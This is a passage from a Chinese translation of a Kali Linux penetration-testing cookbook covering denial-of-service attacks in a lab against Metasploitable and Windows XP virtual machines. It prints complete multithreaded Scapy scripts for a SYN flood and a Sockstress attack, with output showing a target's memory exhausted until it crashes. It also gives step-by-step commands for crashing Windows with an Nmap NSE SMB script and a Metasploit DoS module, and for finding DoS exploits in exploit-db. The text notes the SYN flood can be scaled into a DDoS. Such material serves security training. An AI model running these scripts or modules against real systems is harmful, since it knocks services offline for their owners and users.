  seq= 0
  ack= 0
  dataofs= None
  reserved= 0
  flags= S
  window= 8192
  chksum= None
  urgptr= 0
  options= {}
```


要构建我们的请求的 TCP 层，我们将使用与 IP 层相同的技术。 在提供的示例中，`TCP` 对象赋给了`t`变量。 如前所述，可以通过调用`display()`函数来确定默认配置。 在这里，我们可以看到目标端口的默认值是 HTTP 80 端口。对于我们的首次扫描，我们将 TCP 配置保留默认。现在我们构建了 IP 和 TCP 层，我们可以通过堆叠这些层来构造请求：

```
>>> response = sr1(i/t,verbose=1,timeout=3) 
Begin emission: 
Finished to send 1 packets.
Received 5 packets, got 1 answers, remaining 0 packets 
>>> response.display() 
###[ IP ]###
  version= 4L
  ihl= 5L
  tos= 0x0
  len= 44
  id= 0
  flags= DF
  frag= 0L
  ttl= 64
  proto= tcp
  chksum= 0x9944
  src= 172.16.36.135
  dst= 172.16.36.224
  \options\ 
###[ TCP ]###
     sport= http
     dport= ftp_data
     seq= 3651201360L
     ack= 1
     dataofs= 6L
     reserved= 0L
     flags= SA
     window= 5840
     chksum= 0x1c68
     urgptr= 0
     options= [('MSS', 1460)] 
 ###[ Padding ]###
        load= '\x00\x00'
```

可以通过使用斜杠分隔变量来堆叠 IP 和 TCP 层。 然后可以将这些层赋给表示整个请求的新变量。 然后可以调用`display()`函数来查看请求的配置。 一旦建立了请求，就可以将其传递给发送和接收函数，以便我们可以分析响应：

```
>>> request = (i/t) 
>>> request.display() 
###[ IP ]###
  version= 4
  ihl= None
  tos= 0x0
  len= None
  id= 1
  flags=
  frag= 0
  ttl= 64
  proto= tcp
  chksum= None
  src= 172.16.36.224
  dst= 172.16.36.135
  \options\ 
###[ TCP ]###
     sport= ftp_data
     dport= http
     seq= 0
     ack= 0
     dataofs= None
     reserved= 0
     flags= S
     window= 8192
     chksum= None
     urgptr= 0
     options= {}
```

可以在不独立地构建和堆叠每个层的情况下执行相同的请求。 相反，可以通过直接调用函数并向其传递适当的参数来使用单行命令：

```
>>> sr1(IP(dst="172.16.36.135")/TCP()) 
Begin emission: 
......................................................
Finished to send 1 packets. 
..* 
Received 57 packets, got 1 answers, remaining 0 packets 
<IP  version=4L ihl=5L tos=0x0 len=44 id=0 flags=DF frag=0L ttl=64 proto=tcp chksum=0x9944 src=172.16.36.135 dst=172.16.36.224 options=[] |<TCP  sport=http dport=ftp_data seq=2078775635 ack=1 dataofs=6L reserved=0L flags=SA window=5840 chksum=0xca1e urgptr=0 options=[('MSS', 1460)] |<Padding  load='\x00\x00' |>>> 
```

SYN 泛洪的效率取决于在给定时间段内可以生成的 SYN 请求的数量。 为了提高这个攻击序列的效率，我写了一个多线程脚本，可以执行可由攻击系统处理的，尽可能多的 SYN 数据包注入的并发进程：

```
#!/usr/bin/python

from scapy.all 
import * from time 
import sleep 
import thread 
import random 
import logging 
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

if len(sys.argv) != 4:   
    print "Usage - ./syn_flood.py [Target-IP] [Port Number] [Threads]"   
    print "Example - ./sock_stress.py 10.0.0.5 80 20"   
    print "Example will perform a 20x multi-threaded SYN flood attack"   
    print "against the HTTP (port 80) service on 10.0.0.5"   
    sys.exit()

target = str(sys.argv[1]) 
port = int(sys.argv[2]) 
threads = int(sys.argv[3])

print "Performing SYN flood. Use Ctrl+C to stop attack." 
def synflood(target,port):   
    while 0 == 0:
        x = random.randint(0,65535)      
        send(IP(dst=target)/TCP(dport=port,sport=x),verbose=0)
        
    for x in range(0,threads):   
        thread.start_new_thread(synflood, (target,port))

    while 0 == 0:   
        sleep(1) 
```

脚本在执行时接受三个参数。 这些参数包括目标 IP 地址，SYN  泛洪所发送到的端口号，以及将用于执行 SYN 泛洪的线程或并发进程的数量。 每个线程以生成 0 到 65,535 之间的整数值开始。 此范围表示可分配给源端口的全部可能值。 定义源和目标端口地址的 TCP 报头的部分在长度上都是 16 比特。 每个位可以为 1 或 0。因此，有`2 ** 16`或 65,536 个可能的 TCP 端 口地址。 单个源端口只能维持一个半开连接，因此通过为每个 SYN 请求生成唯一的源端口地址，我们可以大大提高攻击的性能：

```
root@KaliLinux:~# ./syn_flood.py U
sage - ./syn_flood.py [Target-IP] [Port Number] [Threads] 
Example - ./sock_stress.py 10.0.0.5 80 20 
Example will perform a 20x multi-threaded SYN flood attack against the HTTP (port 80) service on 10.0.0.5 
root@KaliLinux:~# ./syn_flood.py 172.16.36.135 80 20 
Performing SYN flood. Use Ctrl+C to stop attack. 
```

当在没有任何参数的情况下执行脚本时，会将使用方法返回给用户。在提供的示例中，脚本对托管在`172.16.36.135`的 TCP 端口 80 上的 HTTP Web 服务执行，具有 20 个并发线程 。脚本本身提供的反馈很少; 但是，可以运行流量捕获工具（如 Wireshark 或 TCPdump）来验证是否正在发送连接。在非常短暂的时间之后，与服务器的连接尝试会变得非常慢或完全无响应。

### 工作原理

TCP 服务只允许建立有限数量的半开连接。 通过快速发送大量的 TCP SYN 请求，这些可用的连接会被耗尽，并且服务器将不再能够接受新的传入连接。 因此，新用户将无法访问该服务。 通过将其用作 DDoS 并且使多个攻击系统同时执行脚本，该攻击的效率可以进一步加强。

## 6.8 Sockstress DoS 攻击

Sockstress DoS 攻击涉及到与目标服务相关的 TCP 端口建立一系列开放连接。 TCP 握手中的最终 ACK 响应的值应为 0。

### 准备

为了使用 Scapy 对目标执行 Sockstress DoS 攻击，你需要有一个运行 TCP 网络服务的远程系统。 提供的示例使用 Metasploitable2 的实例用。 有关设置 Metasploitable2 的更多信息，请参阅本书第一章中的“安装 Metasploitable2”秘籍。 此外，本节需要使用文本编辑器（如 VIM 或 Nano）将脚本写入文件系统。 有关编写脚本的更多信息，请参阅本书第一章中的“使用文本编辑器（VIM 和 Nano）”秘籍。

### 操作步骤

以下脚本使用 Scapy 编写，用于对目标系统执行 Sockstress DoS 攻击。 以下脚本可用于测试漏洞服务：

```py
#!/usr/bin/python
from scapy.all import * 
from time import sleep 
import thread 
import logging 
import os 
import signal 
import sys 
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

if len(sys.argv) != 4:   
    print "Usage - ./sock_stress.py [Target-IP] [Port Number] [Threads]"   
    print "Example - ./sock_stress.py 10.0.0.5 21 20"   
    print "Example will perform a 20x multi-threaded sock-stress DoS attack "   
    print "against the FTP (port 21) service on 10.0.0.5"  
    print "\n***NOTE***"
    print "Make sure you target a port that responds when a connection is made"   
    sys.exit()

target = str(sys.argv[1]) 
dstport = int(sys.argv[2]) 
threads = int(sys.argv[3])

## This is where the magic happens 
def sockstress(target,dstport):   while 0 == 0:      
    try:         
        x = random.randint(0,65535)         
        response = sr1(IP(dst=target)/TCP(sport=x,dport=dstport,flags ='S'),timeout=1,verbose=0)                        
        send(IP(dst=target)/ TCP(dport=dstport,sport=x,window=0,flags='A',ack=(response[TCP].seq + 1))/'\x00\x00',verbose=0)     
    except:         
        pass
 
## Graceful shutdown allows IP Table Repair 
def graceful_shutdown(signal, frame):   
    print '\nYou pressed Ctrl+C!'  
    print 'Fixing IP Tables'   
    os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + target + ' -j DROP')   
    sys.exit()

## Creates IPTables Rule to Prevent Outbound RST Packet to Allow Scapy TCP Connections 
os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + target + ' -j DROP') 
signal.signal(signal.SIGINT, graceful_shutdown)

## Spin up multiple threads to launch the attack
print "\nThe onslaught has begun...use Ctrl+C to stop the attack" 
for x in range(0,threads):   
    thread.start_new_thread(sockstress, (target,dstport))

## Make it go FOREVER (...or at least until Ctrl+C) 
while 0 == 0:   
    sleep(1)

```

请注意，此脚本有两个主要功能，包括 sockstress 攻击功能和单独的正常关机功能。 关闭需要单独的函数，因为为了使脚本正常运行，脚本必须修改本地 iptables 规则。 此更改是必需的，以便使用 Scapy 完成与远程主机的 TCP 连接。 在第三章“端口扫描”的“使用 Scapy 配置连接扫描”中，更彻底地解决了这一问题。 在执行脚本之前，我们可以使用 netstat 和 free 工具为已建立的连接和正在使用的内存获取基线：

```
msfadmin@metasploitable:~$ netstat | grep ESTABLISHED 
tcp6       0      0 172.16.36.131%13464:ssh 172.16.36.1%8191:49826  ESTABLISHED 
udp        0      0 localhost:32840         localhost:32840         ESTABLISHED 
msfadmin@metasploitable:~$ free -m 
             
             total       used       free     shared    buffers     cached 
Mem:           503        157        345          0         13         54 
-/+ buffers/cache:         89        413 
Swap:            0          0          0 
```

通过使用 netstat，然后通过管道输出到`grep`函数，并只提取已建立的连接，我们可以看到只存在两个连接。 我们还可以使用`free`工具查看当前的内存使用情况。 `-m`选项用于返回以兆字节为单位的值。 在确定已建立的连接和可用内存的基线后，我们可以对此目标服务器启动攻击：

```
root@KaliLinux:~# ./sock_stress.py 
Usage - ./sock_stress.py [Target-IP] [Port Number] [Threads] 
Example - ./sock_stress.py 10.0.0.5 21 20 
Example will perform a 20x multi-threaded sock-stress DoS attack against the FTP (port 21) service on 10.0.0.

***NOTE*** 
Make sure you target a port that responds when a connection is made 
root@KaliLinux:~# ./sock_stress.py 172.16.36.131 21 20

The onslaught has begun...use Ctrl+C to stop the attack
```

通过在没有任何提供的参数的情况下执行脚本，脚本将返回预期的语法和用法。脚本在执行时接受三个参数。这些参数包括目标 IP 地址，sock stress DoS 所发送的端口号，以及将用于执行 sock stress DoS 的线程或并发进程的数量。每个线程以生成 0 到 65,535 之间的整数值开始。此范围表示可分配给源端口的全部可能值。定义源和目的地端口地址的 TCP 报头的部分在长度上都是 16 比特。每个位可以为值 1 或 0。因此，有`2 ** 16`或 65,536 个可能的 TCP 端口地址。单个源端口只能维持单个连接，因此通过为每个连接生成唯一的源端口地址，我们可以大大提高攻击的效率。一旦攻击开始，我们可以通过检查在目标服务器上建立的活动连接，来验证它是否正常工作：

```
msfadmin@metasploitable:~$ netstat | grep ESTABLISHED 
tcp        0     20 172.16.36.131:ftp       172.16.36.232:25624     ESTABLISHED 
tcp        0     20 172.16.36.131:ftp       172.16.36.232:12129     ESTABLISHED 
tcp        0     20 172.16.36.131:ftp       172.16.36.232:31294     ESTABLISHED 
tcp        0     20 172.16.36.131:ftp       172.16.36.232:46731     ESTABLISHED 
tcp        0     20 172.16.36.131:ftp       172.16.36.232:15281     ESTABLISHED 
tcp        0     20 172.16.36.131:ftp       172.16.36.232:47576     ESTABLISHED 
tcp        0     20 172.16.36.131:ftp       172.16.36.232:27472     ESTABLISHED 
tcp        0     20 172.16.36.131:ftp       172.16.36.232:11152     ESTABLISHED 
tcp        0     20 172.16.36.131:ftp       172.16.36.232:56245     ESTABLISHED 
tcp        0     20 172.16.36.131:ftp       172.16.36.232:1161      ESTABLISHED 
tcp        0     20 172.16.36.131:ftp       172.16.36.232:21064     ESTABLISHED 
tcp        0     20 172.16.36.131:ftp       172.16.36.232:29344     ESTABLISHED 
tcp        0     20 172.16.36.131:ftp       172.16.36.232:43747     ESTABLISHED 
tcp        0     20 172.16.36.131:ftp       172.16.36.232:59609     ESTABLISHED 
tcp        0     20 172.16.36.131:ftp       172.16.36.232:31927     ESTABLISHED
tcp        0     20 172.16.36.131:ftp       172.16.36.232:12257     ESTABLISHED 
tcp        0     20 172.16.36.131:ftp       172.16.36.232:54709     ESTABLISHED 
tcp        0     20 172.16.36.131:ftp       172.16.36.232:55595     ESTABLISHED 
tcp        0     20 172.16.36.131:ftp       172.16.36.232:12992     ESTABLISHED 
tcp        0     20 172.16.36.131:ftp       172.16.36.232:24171     ESTABLISHED 
tcp        0     20 172.16.36.131:ftp       172.16.36.232:37207     ESTABLISHED 
tcp        0     20 172.16.36.131:ftp       172.16.36.232:39224     ESTABLISHED 
```

在执行脚本后的几分钟，我们可以看到已建立的连接的数量急剧增加。 此处显示的输出已截断，连接列表实际上明显长于此：

```
msfadmin@metasploitable:~$ free -m             
             total       used       free     shared    buffers     cached 
Mem:           503        497          6          0        149        
138 -/+ buffers/cache:        209        294 
Swap:            0          0          0 
```

通过连续使用`free` 工具，我们可以看到，系统的可用内存逐渐耗尽。 一旦内存空闲值下降到几乎没有，空闲缓冲区/缓存空间将开始下降：

```
msfadmin@metasploitable:~$ free -m             
             total       used       free     shared    buffers     cached 
Mem:           503        498          4          0          0          
5 -/+ buffers/cache:        493         10 
Swap:            0          0          0 
```

在本地系统上的所有资源耗尽之后，系统最终会崩溃。 完成此过程所需的时间将取决于可用的本地资源量。 在这里提供的示例中，这是在具有 512 MB RAM 的 Metasploitable VM 上执行的，攻击花费了大约 2 分钟来耗尽所有可用的本地资源并使服务器崩溃。 服务器崩溃后，或者你希望停止 DoS 攻击时，可以按`Ctrl + C`。

```
root@KaliLinux:~# ./sock_stress.py 172.16.36.131 21 20

The onslaught has begun...use Ctrl+C to stop the attack
^C 
pressed Ctrl+C! 
Fixing IP Tables 
```

脚本被编写来捕获由于按`Ctrl + C`而发送的终止信号，并且它将通过去除在终止脚本的执行序列之前生成的规则,来修复本地 iptables。

### 工作原理

在 sockstress DoS 中，三次握手中的最后的 ACK 封包的窗口值为 0。由于连接客户端的空窗口所示，漏洞服务不会传送任何数据来响应连接。 相反，服务器会保存要在内存中传输的数据。 使用这些连接充斥服务器将耗尽服务器的资源，包括内存，交换空间和计算能力。

## 6.9 使用 Nmap NSE 执行 DoS 攻击

Nmap 脚本引擎（NSE）拥有许多可用于执行 DoS 攻击的脚本。 这个特定的秘籍演示了如何找到 NSE DoS 脚本，确定脚本的用法，以及如何执行它们。

### 准备

为了使用 Nmap NSE 执行 DoS 攻击，你需要有一个运行漏洞服务的系统，它易受 Nmap NSE DoS 脚本之一的攻击。 所提供的示例使用 Windows XP 的实例。 有关设置 Windows 系统的更多信息，请参阅本书第一章中的“安装 Windows Server”秘籍。

### 操作步骤

在使用 Nmap NSE 脚本执行 DoS 测试之前，我们需要确定哪些 DoS 脚本可用。 在 Nmap NSE 脚本目录中有一个`greppable script.db`文件，可用于确定任何给定类别中的脚本：

```
root@KaliLinux:~# grep dos /usr/share/nmap/scripts/script.db | cut -d "\"" -f 2 
broadcast-avahi-dos.nse 
http-slowloris.nse ipv6-ra-flood.nse
smb-check-vulns.nse 
smb-flood.nse 
smb-vuln-ms10-054.nse 
```

通过从`script.db`文件中使用`grep`搜索 DoS，然后将输出通过管道传递到`cut`函数，我们可以提取可用的脚本。 通过阅读任何一个脚本的头部，我们通常可以找到很多有用的信息：

```
root@KaliLinux:~# cat /usr/share/nmap/scripts/smb-vuln-ms10-054.nse | more 
local bin = require "bin" 
local msrpc = require "msrpc" 
local smb = require "smb" 
local string = require "string" 
local vulns = require "vulns" 
local stdnse = require "stdnse"

description = [[ 
Tests whether target machines are vulnerable to the ms10-054 SMB remote memory 
corruption vulnerability.

The vulnerable machine will crash with BSOD. 

The script requires at least READ access right to a share on a remote machine. 
Either with guest credentials or with specified username/password. 
```
为了从上到下读取脚本，我们应该对文件使用`cat`命令，然后通过管道输出到`more`工具。 脚本的头部描述了它所利用的漏洞以及系统必须满足的条件。 它还解释了该漏洞将导致蓝屏死机（BSOD）DoS。 通过进一步向下滚动，我们可以找到更多有用的信息：

```
-- @usage nmap  -p 445 <target> 
--script=smb-vuln-ms10-054 
--script-args unsafe 
--- @args unsafe Required to run the script, "safty swich" to prevent running it by accident 
-- @args smb-vuln-ms10-054.share Share to connect to (defaults to SharedDocs)

-- @usage nmap  -p 445 <target> 
--script=smb-vuln-ms10-054 
--script-args unsafe 
--- @args unsafe Required to run the script, "safty swich" to prevent running it by accident 
-- @args smb-vuln-ms10-054.share Share to connect to (defaults to SharedDocs)


-- @output 
-- Host script results: 
-- | smb-vuln-ms10-054: 
-- |   VULNERABLE: 
-- |   SMB remote memory corruption vulnerability 
-- |     State: VULNERABLE 
-- |     IDs:  CVE:CVE-2010-2550 
-- |     Risk factor: HIGH  CVSSv2: 10.0 (HIGH) (AV:N/AC:L/Au:N/C:C/I:C/ A:C) 
-- |     Description: 
-- |       The SMB Server in Microsoft Windows XP SP2 and SP3, Windows Server 2003 SP2, 
-- |       Windows Vista SP1 and SP2, Windows Server 2008 Gold, SP2, and R2, and Windows 7 
-- |       does not properly validate fields in an SMB request, which allows remote attackers 
-- |       to execute arbitrary code via a crafted SMB packet, aka "SMB Pool Overflow Vulnerability."
```

在脚本中，我们可以找到脚本用法和脚本提供的参数的描述。 它还提供了有关其利用的漏洞的其他详细信息。 要执行脚本，我们需要在 Nmap 中使用`--script`选项：

```
root@KaliLinux:~# nmap -p 445 172.16.36.134 --script=smb-vuln-ms10-054 --script-args unsafe=1

Starting Nmap 6.25 ( http://nmap.org ) at 2014-02-28 23:45 EST 
Nmap scan report for 172.16.36.134 
Host is up (0.00038s latency). 
PORT    STATE SERVICE 
445/tcp open  microsoft-ds 
MAC Address: 00:0C:29:18:11:FB (VMware)

Host script results: 
| smb-vuln-ms10-054: 
|   VULNERABLE: 
|   SMB remote memory corruption vulnerability 
|     State: VULNERABLE 
|     IDs:  CVE:CVE-2010-2550
|     Risk factor: HIGH  CVSSv2: 10.0 (HIGH) (AV:N/AC:L/Au:N/C:C/I:C/A:C) 
|     Description: 
|       The SMB Server in Microsoft Windows XP SP2 and SP3, Windows Server 2003 SP2, 
|       Windows Vista SP1 and SP2, Windows Server 2008 Gold, SP2, and R2, and Windows 7 
|       does not properly validate fields in an SMB request, which allows remote attackers 
|       to execute arbitrary code via a crafted SMB packet, aka "SMB Pool Overflow Vulnerability."
```

在提供的示例中，Nmap 被定向为仅扫描 TCP 端口 445，这是该漏洞的相关端口。 `--script`选项与指定所使用的脚本的参数一起使用。 我们传递了单个脚本参数来表明可以接受不安全扫描。 此参数的描述是，可用于授权 DoS 攻击的安全开关。 在 Nmap 中执行脚本后，输出表明系统存在漏洞。 查看 Windows XP 机器，我们可以看到 DoS 成功，这导致了蓝屏：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/6-9-1.jpg)

### 工作原理

本练习中演示的 Nmap NSE 脚本是缓冲区溢出攻击的示例。 一般来说，缓冲区溢出能够导致拒绝服务，因为它们可能导致任意数据被加载到非预期的内存段。 这可能中断执行流程，并导致服务或操作系统崩溃。

## 6.10 Metasploit DoS 攻击

Metasploit 框架有许多辅助模块脚本，可用于执行 DoS 攻击。 这个特定的秘籍演示了如何找到 DoS 模块，确定模块的使用方式，以及如何执行它们。

### 准备

为了使用 Metasploit 执行 DoS 攻击，你需要有一个运行漏洞服务的系统，它易受 Metasploit DoS 辅助模块之一的攻击。 所提供的示例使用 Windows XP 的实例。 有关设置 Windows 系统的更多信息，请参阅本书第一章中的“安装 Windows Server”秘籍。

### 操作步骤

在使用 Metasploit 辅助模块执行 DoS 测试之前，我们需要确定哪些 DoS 模块可用。 相关模块可以通过浏览 Metasploit 目录树来确定：

```

root@KaliLinux:~# cd /usr/share/metasploit-framework/modules/auxiliary/ dos/ 
root@KaliLinux:/usr/share/metasploit-framework/modules/auxiliary/dos# ls cisco  dhcp  freebsd  hp  http  mdns  ntp  pptp  samba  scada  smtp  solaris  ssl  syslog  tcp  wifi  windows  wireshark 
root@KaliLinux:/usr/share/metasploit-framework/modules/auxiliary/dos# cd windows/ 
root@KaliLinux:/usr/share/metasploit-framework/modules/auxiliary/dos/ windows# ls appian  browser  ftp  games  http  llmnr  nat  rdp  smb  smtp  tftp 
root@KaliLinux:/usr/share/metasploit-framework/modules/auxiliary/dos/ windows# cd http 
root@KaliLinux:/usr/share/metasploit-framework/modules/auxiliary/dos/ windows/http# ls ms10_065_ii6_asp_dos.rb  
pi3web_isapi.rb 
```


通过浏览`/ modules / auxiliary / dos`目录，我们可以看到各种类别的 DoS 模块。 在提供的示例中，我们已浏览包含 Windows HTTP 拒绝服务漏洞的目录：

```
root@KaliLinux:/usr/share/metasploit-framework/modules/auxiliary/dos/ windows/http# cat ms10_065_ii6_asp_dos.rb | more 
## 
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit 
# web site for more information on licensing and terms of use. 
#   http://metasploit.com/ 
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

   include Msf::Exploit::Remote::Tcp   
   include Msf::Auxiliary::Dos
   
   def initialize(info = {})      
   super(update_info(info,         
        'Name'           => 'Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service',         
        'Description'    => %q{               
            The vulnerability allows remote unauthenticated attackers to force the IIS server            
            to become unresponsive until the IIS service is restarted manually by the administrator.            
            Required is that Active Server Pages are hosted by the IIS and that an ASP script reads            
            out a Post Form value.         
        },         
        'Author'         =>            
            [               
                'Alligator Security Team',               
                'Heyder Andrade <heyder[at]alligatorteam.org>',               
                'Leandro Oliveira <leadro[at]alligatorteam.org>'            
            ],         
        'License'        => MSF_LICENSE,         
        'References'     =>            
            [               
                [ 'CVE', '2010-1899' ],               
                [ 'OSVDB', '67978'],               
                [ 'MSB', 'MS10-065'],               
                [ 'EDB', '15167' ]            
            ],         
        'DisclosureDate' => 'Sep 14 2010'))
```

为了从上到下读取脚本，我们应该对文件使用`cat`命令，然后通过管道输出到`more`工具。 脚本的顶部描述了它所利用的漏洞以及系统必须满足的条件。 我们还可以在 Metasploit 框架控制台中识别潜在的 DoS 漏洞。 要访问它，在终端中键入`msfconsole`：

```
root@KaliLinux:~# msfconsole # cowsay++
 ____________
< metasploit > 
 -----------       
       \   ,__,        
        \  (oo)____           
           (__)    )\              
              ||--|| *
              
Large pentest? List, sort, group, tag and search your hosts and services in Metasploit Pro -- type 'go_pro' to launch it now.

       =[ metasploit v4.6.0-dev [core:4.6 api:1.0] 
+ -- --=[ 1053 exploits - 590 auxiliary - 174 post 
+ -- --=[ 275 payloads - 28 encoders - 8 nops

msf > 
```


一旦打开，搜索命令可以与搜索项结合使用，来确定要使用的漏洞利用：

```
msf > search dos

Matching Modules 
================

   Name                                                        Disclosure Date  Rank       Description   ----                                                        --------------  ----       ----------
   auxiliary/admin/webmin/edit_html_fileaccess                 2012-09-06       normal     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access   
   auxiliary/dos/cisco/ios_http_percentpercent                 2000-04-26       normal     Cisco IOS HTTP GET /%% request Denial of Service   
   auxiliary/dos/dhcp/isc_dhcpd_clientid                                        normal     ISC DHCP Zero Length ClientID Denial of Service Module   
   auxiliary/dos/freebsd/nfsd/nfsd_mount                                        normal     FreeBSD Remote NFS RPC Request Denial of Service   
   auxiliary/dos/hp/data_protector_rds                         2011-01-08       manual     HP Data Protector Manager RDS DOS   
   auxiliary/dos/http/3com_superstack_switch                   2004-06-24       normal     3Com SuperStack Switch Denial of Service   
   auxiliary/dos/http/apache_mod_isapi                         2010-03-05       normal     Apache mod_isapi <= 2.2.14 Dangling Pointer   
   auxiliary/dos/http/apache_range_dos                         2011-08-19       normal     Apache Range header DoS (Apache Killer)   
   auxiliary/dos/http/apache_tomcat_transfer_encoding          2010-07-09       normal     Apache Tomcat Transfer-Encoding Information Disclosure and DoS 
```

在提供的示例中，搜索项 dos 用于查询数据库。 返回一系列 DoS 辅助模块，并且包括每个 DoS 辅助模块的相对路径。 此相对路径可用于缩小搜索结果范围：

```
msf > search /dos/windows/smb/

Matching Modules 
================

   Name                                                        Disclosure Date  Rank    Description   
   ----                                                        --------------  ----    ----------   
   auxiliary/dos/windows/smb/ms05_047_pnp                                       normal  Microsoft Plug and Play Service Registry Overflow   
   auxiliary/dos/windows/smb/ms06_035_mailslot                 2006-07-11       normal  Microsoft SRV.SYS Mailslot Write Corruption   
   auxiliary/dos/windows/smb/ms06_063_trans                                     normal  Microsoft SRV.SYS Pipe Transaction No Null   
   auxiliary/dos/windows/smb/ms09_001_write                                     normal  Microsoft SRV.SYS WriteAndX Invalid DataOffset   
   auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                    normal  Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
   
   auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                       normal  Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference   
   auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                   normal  Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop   
   auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                     normal  Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS   
   auxiliary/dos/windows/smb/ms11_019_electbowser                               manual  Microsoft Windows Browser Pool DoS   
   auxiliary/dos/windows/smb/rras_vls_null_deref               2006-06-14       normal  Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference   
   auxiliary/dos/windows/smb/vista_negotiate_stop                               normal  Microsoft Vista SP0 SMB Negotiate Protocol DoS 
```

在查询`/ dos / windows / smb`的相对路径后，返回的唯一结果是此目录中的 DoS 模块。 目录组织良好，可用于有效地搜索与特定平台或服务相关的漏洞。 一旦我们决定使用哪个漏洞，我们可以使用`use`命令和模块的相对路径来选择它：

```
msf > use auxiliary/dos/windows/smb/ms06_063_trans 
msf  auxiliary(ms06_063_trans) > show options

Module options (auxiliary/dos/windows/smb/ms06_063_trans):
   
   Name   Current Setting  Required  Description   ----   
   ---------------  --------  ----------   
   RHOST                   yes       The target address   
   RPORT  445              yes       Set the SMB service port
```

一旦选择了模块，`show options`命令可用于确定和/修改扫描配置。 此命令会显示四个列标题，包括`Name`, `Current Setting`, `Required`, 和 `Description`。 `Name`列表示每个可配置变量的名称。 `Current Setting`列列出任何给定变量的现有配置。  `Required`列表明任何给定变量是否需要值。 `Description`列描述每个变量的函数。 可以使用`set`命令并通过提供新值作为参数，来更改任何给定变量的值：

```
msf  auxiliary(ms06_063_trans) > set RHOST 172.16.36.134 
 => 172.16.36.134 
 msf  auxiliary(ms06_063_trans) > show options
 
Module options (auxiliary/dos/windows/smb/ms06_063_trans):
   
   Name   Current Setting  Required  Description   
   ----   ---------------  --------  ----------   
   RHOST  172.16.36.134    yes       The target address   
   RPORT  445              yes       Set the SMB service port 
```

在提供的示例中，`RHOST`值更改为我们打算扫描的远程系统的 IP 地址。 更新必要的变量后，可以使用`show options`命令再次验证配置。 一旦验证了所需的配置，可以使用`run`命令启动模块：

```
msf  auxiliary(ms06_063_trans) > run

[*] Connecting to the target system... 
[*] Sending bad SMB transaction request 1... 
[*] Sending bad SMB transaction request 2... 
[*] Sending bad SMB transaction request 3... 
[*] Sending bad SMB transaction request 4... 
[*] Sending bad SMB transaction request 5... 
[*] Auxiliary module execution completed 
```

在执行 Metasploit DoS 辅助模块之后，返回的一系列消息表明已经执行了一系列恶意 SMB 事务，并且返回表示模块执行完成的最终消息。 该漏洞的成功可以通过查看 Windows XP 系统来验证，它已经崩溃，现在显示 BSOD：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-net-scan-cb/img/6-9-1.jpg)

### 工作原理

本练习中演示的 Metasploit DoS 辅助模块是缓冲区溢出攻击的示例。 一般来说，缓冲区溢出能够导致拒绝服务，因为它们可能导致任意数据被加载到非预期的内存段。 这可能中断执行流程，并导致服务或操作系统崩溃。

## 6.11 使用 exploit-db 执行 DoS 攻击

exploit-db 是针对所有类型的平台和服务的，公开发布的漏洞利用集合。 exploit-db 拥有许多可用于执行 DoS 攻击的漏洞。 这个特定的秘籍演示了如何在 exploit-db 中找到 DoS 漏洞，确定漏洞的用法，进行必要的修改并执行它们。

### 准备

为了使用 exploit-db 执行 DoS 攻击，你需要有一个运行漏洞服务的系统，它易受 Metasploit DoS 辅助模块之一的攻击。 所提供的示例使用 Windows XP 的实例。 有关设置 Windows 系统的更多信息，请参阅本书第一章中的“安装 Windows Server”秘籍。

### 操作步骤

在使用 exploit-db 执行 DoS 测试之前，我们需要确定哪些 DoS 漏洞可用。 可以在`http://www.exploit-db.com`在线找到全部的漏洞利用数据库。 或者，其副本也本地存储在 Kali Linux 文件系统中。 在`exploitdb`目录中有一个`files.csv`文件，其中包含所有内容的目录。 此文件可用于对关键字进行`grep`，来帮助定位可用的漏洞利用：

```
root@KaliLinux:~# grep SMB /usr/share/exploitdb/files.csv 
20,platforms/windows/remote/20.txt,"MS Windows SMB Authentication Remote Exploit",2003-04-25,"Haamed Gheibi",windows,remote,139 
1065,platforms/windows/dos/1065.c,"MS Windows (SMB) Transaction Response Handling Exploit (MS05-011)",2005-06-23,cybertronic,windows,dos,0 
4478,platforms/linux/remote/4478.c,"smbftpd 0.96 SMBDirListfunction Remote Format String Exploit",2007-10-01,"Jerry Illikainen",linux,remote,21 
6463,platforms/windows/dos/6463.rb,"MS Windows WRITE_ANDX SMB command handling Kernel DoS (meta)",2008-09-15,"Javier Vicente Vallejo",windows,dos,0
9594,platforms/windows/dos/9594.txt,"Windows Vista/7 SMB2.0 Negotiate Protocol Request Remote BSOD Vuln",2009-09-09,"Laurent Gaffie",windows,dos,0
```

在所提供的示例中，我们使用`grep`函数在`files.csv`文件中搜索包含 SMB 的任何 exploit-db 内容。 还可以通过将输出通过管道连接到另一个`grep`函数，并搜索附加项来进一步缩小搜索范围：

```
root@KaliLinux:~# grep SMB /usr/share/exploitdb/files.csv | grep dos 
1065,platforms/windows/dos/1065.c,"MS Windows (SMB) Transaction Response Handling Exploit (MS05-011)",2005-06-23,cybertronic,windows,dos,0 
6463,platforms/windows/dos/6463.rb,"MS Windows WRITE_ANDX SMB command handling Kernel DoS (meta)",2008-09-15,"Javier Vicente Vallejo",windows,dos,0 
9594,platforms/windows/dos/9594.txt,"Windows Vista/7 SMB2.0 Negotiate Protocol Request Remote BSOD Vuln",2009-09-09,"Laurent Gaffie",windows,dos,0 
12258,platforms/windows/dos/12258.py,"Proof of Concept for MS10-006 SMB Client-Side Bug",2010-04-16,"Laurent Gaffie",windows,dos,0 
